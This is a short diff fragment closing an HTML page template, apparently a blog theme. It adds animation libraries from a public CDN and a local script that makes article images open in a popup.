+  <link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
+  <script src="//cdn.bootcss.com/scrollReveal.js/3.0.5/scrollreveal.js"></script>
+  <script src="/js/animate.js"></script>
+
+
+  <script src="/js/pop-img.js"></script>
+  <script>
+     $(".article-entry p img").popImg();
+  </script>
+
+  </div>
+</body>
+</html>
